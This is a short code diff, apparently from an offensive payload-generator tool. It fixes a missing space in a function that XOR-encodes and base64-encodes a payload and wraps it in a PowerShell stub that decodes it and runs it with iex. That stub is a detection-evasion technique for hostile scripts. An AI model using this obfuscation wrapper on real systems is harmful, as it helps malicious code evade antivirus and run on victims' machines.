@@ -17,7 +17,7 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         code = xor(code, args.xor) # XOR encode using random key <--
         code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
         code = """$k={0};$b="{1}";$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
-        code= prefix + "-Command" + "'%s'" % code
+        code= prefix + "-Command " + "'%s'" % code
     return code
 
 def base64_wrapper(name, code, args,shell="/bin/bash"):
